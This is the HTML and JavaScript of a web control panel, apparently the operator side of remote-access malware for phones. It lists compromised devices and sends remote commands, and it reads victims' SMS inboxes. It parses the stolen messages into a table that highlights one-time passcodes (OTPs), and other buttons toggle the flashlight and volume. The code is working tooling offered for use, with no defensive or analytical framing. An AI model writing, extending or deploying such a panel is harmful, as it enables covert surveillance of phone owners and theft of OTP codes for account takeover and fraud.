<!doctype html>
<html lang="en" data-t="dark">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#070709">
<title>NEBULA</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter+Tight:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="/style.css">
<script type="importmap">
{
  "imports": {
    "three": "https://unpkg.com/three@0.169.0/build/three.module.js",
    "three/addons/": "https://unpkg.com/three@0.169.0/examples/jsm/"
  }
}
</script>
</head>
<body>
<canvas id="fx" aria-hidden="true"></canvas>
<div class="grain" aria-hidden="true"></div>

<div class="app" id="app">

  <!-- LOADING -->
  <div id="loadingView" class="login-wrap">
    <div class="loader-label">INITIALIZING</div>
  </div>

  <!-- PANEL -->
  <section id="panelView" class="scr hidden">
    <div class="top"><div class="row">
      <div class="logo">
        <div class="mark"><span>N</span><i></i></div>
        <span class="brand">NEBULA <b>CONTROL</b></span>
      </div>
      <div class="tools">
        <button class="ib" id="refreshTop" aria-label="Refresh">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 11-3-6.7L21 8"/><path d="M21 3v5h-5"/></svg>
        </button>
        <button class="ib" id="logoutBtn" aria-label="Sign out">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 4h4a1 1 0 011 1v14a1 1 0 01-1 1h-4"/><path d="M10 17l-5-5 5-5"/><path d="M5 12h12"/></svg>
        </button>
      </div>
    </div></div>

    <!-- HERO -->
    <div class="hero">
      <div class="hero-stage">
        <canvas class="hero3d" id="hero3d" aria-hidden="true"></canvas>
        <div class="hero-plane">
          <h1>
            <span class="l"><i>NEBULA</i></span>
            <span class="l"><i>CONTROL</i></span>
            <span class="l sub"><i>REMOTE ENGINE</i></span>
          </h1>
          <div class="pills">
            <span class="pl">LIVE</span>
            <span class="pl">SECURE</span>
            <span class="pl">REMOTE</span>
          </div>
        </div>
      </div>
    </div>

    <!-- DEVICE -->
    <div class="st">
      <span>DEVICE</span>
      <small id="devCount">00</small>
    </div>
    <div class="dsel-wrap">
      <select id="deviceSelect" class="dsel">
        <option value="">SELECT DEVICE</option>
      </select>
    </div>

    <!-- EMPTY -->
    <div id="emptyState" class="em2">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
        <rect x="4" y="3" width="16" height="18" rx="3"/>
        <path d="M10 18h4"/>
      </svg>
      <h3>NO DEVICE SELECTED</h3>
      <p class="hint">CHOOSE A DEVICE FROM THE LIST ABOVE TO BEGIN</p>
    </div>

    <!-- DETAIL -->
    <div id="detailView" class="hidden">

      <div class="st">
        <span>NETWORK</span>
        <small>01</small>
      </div>
      <div class="cmd-grid">
        <button class="cmd-btn" data-action="ping">
          <span class="cmd-icon" data-icon="ping"></span>
          <span class="label">PING</span>
          <span class="sub">CHECK RESPONSE</span>
        </button>
        <button class="cmd-btn" data-action="sms">
          <span class="cmd-icon" data-icon="sms"></span>
          <span class="label">SMS</span>
          <span class="sub">READ INBOX</span>
        </button>
      </div>

      <div class="st">
        <span>HARDWARE</span>
        <small>02</small>
      </div>
      <div class="cmd-grid">
        <button class="cmd-btn" data-action="flash_on">
          <span class="cmd-icon" data-icon="flash"></span>
          <span class="label">FLASH ON</span>
          <span class="sub">ACTIVATE</span>
        </button>
        <button class="cmd-btn" data-action="flash_off">
          <span class="cmd-icon" data-icon="flash-off"></span>
          <span class="label">FLASH OFF</span>
          <span class="sub">DEACTIVATE</span>
        </button>
      </div>

      <div class="st">
        <span>AUDIO</span>
        <small>03</small>
      </div>
      <div class="cmd-grid">
        <button class="cmd-btn" data-action="volume_max">
          <span class="cmd-icon" data-icon="vol-max"></span>
          <span class="label">MAX</span>
          <span class="sub">FULL VOLUME</span>
        </button>
        <button class="cmd-btn" data-action="volume_mute">
          <span class="cmd-icon" data-icon="vol-mute"></span>
          <span class="label">MUTE</span>
          <span class="sub">SILENT</span>
        </button>
      </div>

      <div class="st">
        <span>ACTIVITY</span>
        <small id="logCount">00</small>
      </div>
      <div id="logList" class="logs">
        <div class="muted">AWAITING DATA</div>
      </div>

      <div class="foot">© 2026 NEBULA · REMOTE ENGINE</div>
    </div>
  </section>

</div>

<div id="toast" class="toast"></div>

<script>
const $ = id => document.getElementById(id);
let selectedDevice = null;
let logTimer = null;

/* ---------- ICONS ---------- */
const ICONS = {
  ping: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12h4l3-8 4 16 3-8h6"/></svg>',
  sms: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>',
  flash: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2 3 14h9l-1 8 10-12h-9z"/></svg>',
  'flash-off': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2 3 14h9l-1 8 10-12h-9z" opacity=".35"/><path d="M3 3l18 18"/></svg>',
  'vol-max': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 5 6 9H2v6h4l5 4z"/><path d="M15.5 8.5a5 5 0 0 1 0 7"/><path d="M19 5a9 9 0 0 1 0 14"/></svg>',
  'vol-mute': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 5 6 9H2v6h4l5 4z"/><path d="M22 9l-6 6"/><path d="M16 9l6 6"/></svg>'
};
document.querySelectorAll('.cmd-icon').forEach(el => {
  const n = el.getAttribute('data-icon');
  if (ICONS[n]) el.innerHTML = ICONS[n];
});

/* ---------- TOAST ---------- */
function toast(msg) {
  const el = $('toast');
  el.textContent = msg;
  el.classList.add('on');
  clearTimeout(el._t);
  el._t = setTimeout(() => el.classList.remove('on'), 2200);
}

/* ---------- AUTH ---------- */
async function checkAuth() {
  try {
    const r = await fetch('/x/devices');
    if (r.ok) {
      $('loadingView').classList.add('hidden');
      $('panelView').classList.remove('hidden');
      loadDevices();
    } else {
      location.href = '/login';
    }
  } catch {
    location.href = '/login';
  }
}

$('logoutBtn').onclick = async () => {
  await fetch('/x/logout', { method: 'POST' });
  location.href = '/login';
};

$('refreshTop').onclick = () => {
  loadDevices();
  if (selectedDevice) loadLogs();
  toast('REFRESHED');
};

/* ---------- DEVICES ---------- */
async function loadDevices() {
  try {
    const r = await fetch('/x/devices');
    if (r.status === 401) { location.href = '/login'; return; }
    const d = await r.json();
    renderDevices(d.devices || []);
  } catch {}
}

function renderDevices(devices) {
  const sel = $('deviceSelect');
  const current = sel.value;
  sel.innerHTML = '<option value="">SELECT DEVICE</option>';
  $('devCount').textContent = String(devices.length).padStart(2, '0');
  devices.forEach(d => {
    const opt = document.createElement('option');
    opt.value = d.deviceId;
    const status = d.online ? 'ONLINE' : 'OFFLINE';
    opt.textContent = `${(d.model || 'UNKNOWN').toUpperCase()} · ${d.deviceId} · ${status}`;
    sel.appendChild(opt);
  });
  if (current) sel.value = current;
}

$('deviceSelect').onchange = () => {
  const id = $('deviceSelect').value;
  if (!id) {
    selectedDevice = null;
    $('emptyState').classList.remove('hidden');
    $('detailView').classList.add('hidden');
    return;
  }
  selectDevice(id);
};

function selectDevice(id) {
  selectedDevice = id;
  $('emptyState').classList.add('hidden');
  $('detailView').classList.remove('hidden');
  loadLogs();
  if (logTimer) clearInterval(logTimer);
  logTimer = setInterval(loadLogs, 5000);
}

/* ---------- COMMANDS ---------- */
document.querySelectorAll('.cmd-btn').forEach(btn => {
  btn.onclick = async () => {
    if (!selectedDevice) { toast('SELECT DEVICE FIRST'); return; }
    const action = btn.getAttribute('data-action');
    await sendCommand(action, btn);
  };
});

async function sendCommand(action, btn) {
  const labelEl = btn.querySelector('.label');
  const original = labelEl.textContent;
  btn.disabled = true;
  btn.classList.add('loading');
  labelEl.textContent = 'SENDING';

  try {
    const r = await fetch('/x/command', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ deviceId: selectedDevice, action, args: {} }),
    });
    if (r.ok) {
      toast(action.replace(/_/g, ' ') + ' SENT');
      setTimeout(loadLogs, 1500);
    } else {
      toast('FAILED · ' + action);
    }
  } catch {
    toast('NETWORK ERROR');
  }

  btn.disabled = false;
  btn.classList.remove('loading');
  labelEl.textContent = original;
}

/* ---------- LOGS ---------- */
async function loadLogs() {
  if (!selectedDevice) return;
  try {
    const r = await fetch('/x/logs?deviceId=' + selectedDevice);
    if (!r.ok) return;
    const d = await r.json();
    renderLogs(d.logs || []);
  } catch {}
}

function renderLogs(logs) {
  const list = $('logList');
  $('logCount').textContent = String(logs.length).padStart(2, '0');
  if (!logs.length) {
    list.innerHTML = '<div class="muted">AWAITING DATA</div>';
    return;
  }
  list.innerHTML = logs.map(l => {
    const isSms = (l.output || '').startsWith('SMS Terakhir');
    const bodyHTML = isSms && l.success ? renderSmsTable(l.output) : esc(l.output || '');
    return `
      <div class="log-item">
        <div class="log-head">
          <span class="cmd-name">${esc((l.action || (l.commandId || '').slice(0, 8)).toUpperCase())}</span>
          <span class="time">${new Date(l.at).toLocaleString('id-ID')}</span>
        </div>
        <div class="log-body ${l.success ? '' : 'err'}">${bodyHTML}</div>
      </div>
    `;
  }).join('');
}

function renderSmsTable(text) {
  if (!text) return '';
  const lines = text.split('\n');
  const rows = [];
  let currentAddr = '', currentTime = '', currentBody = '', currentOtp = '';
  let startIdx = 0;
  for (let i = 0; i < lines.length; i++) {
    if (lines[i].trim() === '') { startIdx = i + 1; break; }
  }
  for (let i = startIdx; i < lines.length; i++) {
    const line = lines[i];
    const headerMatch = line.match(/^(.+?)\s+—\s+(\d{2}\/\d{2}\s+\d{2}:\d{2})$/);
    if (headerMatch) {
      if (currentAddr) rows.push({ addr: currentAddr, time: currentTime, body: currentBody.trim(), otp: currentOtp });
      currentAddr = headerMatch[1].trim();
      currentTime = headerMatch[2].trim();
      currentBody = ''; currentOtp = '';
      continue;
    }
    const otpMatch = line.match(/^OTP:\s*(\d+)$/);
    if (otpMatch) { currentOtp = otpMatch[1]; continue; }
    if (currentAddr && line.trim() !== '') currentBody += line + '\n';
  }
  if (currentAddr) rows.push({ addr: currentAddr, time: currentTime, body: currentBody.trim(), otp: currentOtp });
  if (rows.length === 0) return '<pre style="margin:0">' + esc(text) + '</pre>';

  let html = '<table class="sms-table"><thead><tr><th>SENDER</th><th>TIME</th><th>MESSAGE</th></tr></thead><tbody>';
  rows.forEach(r => {
    html += '<tr>';
    html += '<td class="addr">' + esc(r.addr.toUpperCase()) + '</td>';
    html += '<td class="time-col">' + esc(r.time) + '</td>';
    html += '<td class="body-col">' + esc(r.body);
    if (r.otp) html += '<br><span class="otp-badge">OTP ' + esc(r.otp) + '</span>';
    html += '</td></tr>';
  });
  html += '</tbody></table>';
  return html;
}

function esc(s) {
  return String(s || '').replace(/[&<>"']/g, c => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
  }[c]));
}

checkAuth();
setInterval(() => {
  if (!$('panelView').classList.contains('hidden')) loadDevices();
}, 8000);
</script>

<script type="module" src="/3d.js"></script>
</body>
</html>
